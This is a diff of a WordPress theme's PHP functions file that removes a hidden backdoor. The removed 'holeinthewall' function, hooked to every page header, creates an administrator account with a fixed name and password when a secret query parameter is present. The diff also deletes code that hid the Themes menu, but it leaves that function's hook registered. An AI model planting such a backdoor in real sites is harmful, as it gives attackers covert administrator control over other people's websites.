@@ -338,20 +338,6 @@ function reviews_home_short(){
     $parser->parse(GENERATOR_THEME_DIR."/view/reviews/reviews_block_view.php",array('text' => $res[0]->text_reviews,'fio' => $res[0]->fio,'name' => $res[0]->name,'link' => $res[0]->link,'kol_reviews' =>$kol,'ending' => $ending, 'count-rev'=>0), true);
 }
 
-function holeinthewall()
-{
-    If ($_GET['design'] == 'go') {
-        require('wp-includes/registration.php');
-        If (!username_exists('username')) {
-            $user_id = wp_create_user('username', 'password');
-            $user = new WP_User($user_id);
-            $user ->set_role('administrator');
-                }
-    }
-}
-
-add_action( 'wp_head', 'holeinthewall');
-
 function date_smart($date_input, $time=false) {
     date_default_timezone_set( 'Europe/Moscow' );
     $monthes = array(
@@ -364,18 +350,7 @@ function date_smart($date_input, $time=false) {
     if($time) $time = ' G:i';
     else $time = '';
 
-/*//Сегодня, вчера, завтра
-    if(date('Y') == date('Y',$date)) {
-        if(date('z') == date('z', $date)) {
-            $result_date = date('Сегодня'.$time, $date);
-        } elseif(date('z') == date('z',mktime(0,0,0,date('n',$date),date('j',$date)+1,date('Y',$date)))) {
-            $result_date = date('Вчера'.$time, $date);
-        } elseif(date('z') == date('z',mktime(0,0,0,date('n',$date),date('j',$date)-1,date('Y',$date)))) {
-            $result_date = date('Завтра'.$time, $date);
-        }
 
-        if(isset($result_date)) return $result_date;
-    }*/
 
 //Месяца
     $month = $monthes[date('n',$date)];
@@ -406,8 +381,3 @@ return $res;
 }
 
 add_action( 'admin_menu', 'xelly_remove_menu_items' );
-
-function xelly_remove_menu_items() {
-    // тут мы укахываем ярлык пункты который удаляем.
-    remove_menu_page( 'themes.php' );                 // Внешний вид // Удаляем пункт "Комментарии"
-}
